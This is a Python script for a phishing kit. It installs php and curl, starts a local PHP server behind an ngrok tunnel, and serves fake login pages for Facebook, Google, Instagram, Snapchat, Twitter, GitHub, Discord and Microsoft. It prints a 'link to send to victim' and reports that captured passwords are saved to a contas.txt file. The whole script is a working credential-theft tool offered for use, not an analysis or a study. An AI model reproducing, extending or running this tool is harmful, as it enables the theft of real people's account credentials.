#!/usr/bin/python
# -*- coding: utf8 -*-

import os
from time import sleep
import sys
import random

def color(string, color=None):
    attr = []
    attr.append('1')
    
    if color:
        if color.lower() == "red":
            attr.append('31')
        elif color.lower() == "green":
            attr.append('32')
        elif color.lower() == "blue":
            attr.append('34')
        elif color.lower() == "yellow":
            attr.append('33')
        return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)

def horas():
    print color ("  Hours         Date","green")
    os.system(' date +"  %R      %D" ')

x = random.randint(1000,9000)


def criar(tela):
    port = str(x)
    http = 'echo " $(curl -s -N http://127.0.0.1:4040/status | grep -o "http://[0-9a-z]*\-[0-9a-z]*\-[0-9a-z]*\-[0-9a-z]*\-[0-9a-z]*\-[0-9a-z]*\-[0-9a-z]*\-[0-9a-z]*\-[0-9a-z]*\.ngrok.io")"'
    os.system("chmod +x ngrok")
    os.system("nohup ./ngrok http "+port+" &")
    os.system("clear")
    horas()
    print color("""
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠤⠖⠚⢉⣩⣭⡭⠛⠓⠲⠦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⢀⡴⠋⠁⠀⠀⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⢦⡀⠀⠀⠀⠀
    ⠀⠀⠀⠀⢀⡴⠃⢀⡴⢳⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣆⠀⠀⠀⠀
    ⠀⠀⠀⠀⡾⠁⣠⠋⠀⠈⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢧⠀⠀
    ⠀⠀⠀⣸⠁⢰⠃⠀⠀⠀⠈⢣⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣇⠀
    ⠀⠀⠀⡇⠀⡾⡀⠀⠀⠀⠀⣀⣹⣆⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⠀
    ⠀⠀⢸⠃⢀⣇⡈⠀⠀⠀⠀⠀⠀⢀⡑⢄⡀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇
    ⠀⠀⢸⠀⢻⡟⡻⢶⡆⠀⠀⠀⠀⡼⠟⡳⢿⣦⡑⢄⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇
    ⠀⠀⣸⠀⢸⠃⡇⢀⠇⠀⠀⠀⠀⠀⠀⡼⠀⠀⠈⣿⡗⠂⠀⠀⠀⠀⠀⠀⠀⢸⠁
    ⠀⠀⡏⠀⣼⠀⢳⠊⠀⠀⠀⠀⠀⠀⠱⣀⣀⠔⣸⠁⠀⠀⠀⠀⠀⠀⢠⡟⠀
    ⠀⠀⡇⢀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⢸⠃⠀
    ⠀⢸⠃⠘⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠁⠀⠀⢀⠀⠀⠀⠀⠀⣾⠀⠀
    ⠀⣸⠀⠀⠹⡄⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⡞⠀⠀⠀⠸⠀⠀⠀⠀⠀⡇⠀⠀
    ⠀⡏⠀⠀⠀⠀⠙⣆⠀⠀⠀⠀⠀⠀⠀⢀⣠⢶⡇⠀⠀⢰⡀⠀⠀⠀⠀⡇⠀⠀
    ⢰⠇⡄⠀⠀⠀⠀⡿⢣⣀⣀⣀⡤⠴⡞⠉⠀⢸⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⣧⠀⠀
    ⣸⠀⡇⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⢹⠀⠀⢸⠀⠀⢀⣿⠇⠀⠀⠀⠁⠀⢸⠀⠀
    ⣿⠀⡇⠀⠀⠀⠀⠀⠀⢀⡤⠤⠶⠶⠾⠤⠄⢸⠀⡀⠸⣿⣀⠀⠀⠀⠀⠀⠈⣇⠀
    ⡇⠀⡇⠀⠀⡀⠀⡴⠋⠀⠀⠀⠀⠀⠀⠸⡌⣵⡀⢳⡇⠀⠀⠀⠀⠀⠀⢹⡀
    ⡇⠀⠇⠀⠀⡇⡸⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠮⢧⣀⣻⢂⠀⠀⠀⠀⠀⠀⢧
    ⣇⠀⢠⠀⠀⢳⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡎⣆⠀⠀⠀⠀⠀⠘
    ⢻⠀⠈⠰⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⠘⢮⣧⡀⠀⠀⠀⠀
    ⠸⡆⠀⠀⠇⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠆⠀⠀⠀⠀⠀⠀⠀⠙⠳⣄⡀⢢⡀

        ""","yellow")
    sleep(1)
    print color("""
Important: email passwords will be saved in:""","red")
    print color(" sites/"+tela+"/contas.txt","green")
    print("")
    print color(" Link to send to victim:","blue")
    os.system(http)
    print("")
    print color(" Log:","blue")
    os.system("cd sites/"+tela+" && php -S 127.0.0.1:"+port)

os.system("clear")
horas()
print ("""
       ████▌█████▌█░████████▐▀██▀
     ▄█████░█████▌░█░▀██████▌█▄▄▀▄
     ▌███▌█░▐███▌▌░░▄▄░▌█▌███▐███░▀
    ▐  ██░░▄▄▐▀█░░░▐▄█▀▌█▐███▐█
      ███░▌▄█▌░░▀░░▀██░░▀██████▌
       ▀█▌▀██▀░▄░░░░░░░░░███▐███
        ██▌░░░░░░░░░░░░░▐███████▌
        ███░░░░░▀█▀░░░░░▐██▐███▀▌
        ▌█▌█▄░░░░░░░░░▄▄████▀░▀
         █▀██▄▄▄░▄▄▀▀▒█▀█░

       Checking System

""")
if os.system("php -v > /dev/null 2>&1"):
    print color(" [X] php not found","red")
    print color(" Installing...","yellow")
    os.system("sudo apt-get install php -y > /dev/null 2>&1")
    print color(" [ ✔ ] php","green")
else:
    print color(" [ ✔ ] php","green")
sleep(1)
if os.system("curl -h > /dev/null 2>&1"):
    print color(" [X] curl not found","red")
    print color(" Installing...","yellow")
    os.system("sudo apt-get install curl -y > /dev/null 2>&1")
    print color(" [ ✔ ] curl","green")
else:
    print color(" [ ✔ ] curl","green")
sleep(1)


sleep(1)
os.system("clear")
horas()
print color("""
    ───▄▀▀▀▄▄▄▄▄▄▄▀▀▀▄───
    ───█▒▒░░░░░░░░░▒▒█───
    ────█░░█░░░░░█░░█────
    ─▄▄──█░░░▀█▀░░░█──▄▄─
    █░░█─▀▄░░░░░░░▄▀─█░░█
    █▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
    █░░╦─╦╔╗╦─╔╗╔╗╔╦╗╔╗░░█
    █░░║║║╠─║─║─║║║║║╠─░░█
    █░░╚╩╝╚╝╚╝╚╝╚╝╩─╩╚╝░░█
    █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█

        Fake WebSite

    [1] Facebook    [7] Discord
    [2] Google      [8] Microsoft
    [3] Instagram   [9] Close
    [4] SnapChat
    [5] Twitter
    [6] Github
    

""","yellow")

number = 0
while number != 9:
     sleep(1)
     number = int(input(color("WebSite: ","yellow")))
     if number == 1:
         criar("facebook")
     elif number == 2:
         criar("google")
     elif number == 3:
         criar("instagram")
     elif number == 4:
         criar("snapchat")
     elif number == 5:
         criar("twitter")
     elif number == 6:
         criar("github")
     elif number == 7:
         criar("discord")
     elif number == 8:
         criar("microsoft")
     elif number == 9:
         os.system("clear")
     else:
         print color(" [X] Please select the right option","red")

else:
    os.system("clear")
horas()
print ("""

    ░░░░█▐▄▒▒▒▌▌▒▒▌░▌▒▐▐▐▒▒▐▒▒▌▒▀▄▀▄░
    ░░░█▐▒▒▀▀▌░▀▀▀░░▀▀▀░░▀▀▄▌▌▐▒▒▒▌▐░
    ░░▐▒▒▀▀▄▐░▀▀▄▄░░░░░░░░░░░▐▒▌▒▒▐░▌
    ░░▐▒▌▒▒▒▌░▄▄▄▄█▄░░░░░░░▄▄▄▐▐▄▄▀░░
    ░░▌▐▒▒▒▐░░░░░░░░░░░░░▀█▄░░░░▌▌░░░
    ▄▀▒▒▌▒▒▐░░░░░░░▄░░▄░░░░░▀▀░░▌▌░░░
    ▄▄▀▒▐▒▒▐░░░░░░░▐▀▀▀▄▄▀░░░░░░▌▌░░░
    ░░░░█▌▒▒▌░░░░░▐▒▒▒▒▒▌░░░░░░▐▐▒▀▀▄
    ░░▄▀▒▒▒▒▐░░░░░▐▒▒▒▒▐░░░░░▄█▄▒▐▒▒▒
    ▄▀▒▒▒▒▒▄██▀▄▄░░▀▄▄▀░░▄▄▀█▄░█▀▒▒▒▒

            THANKS <3
""")
sleep(1)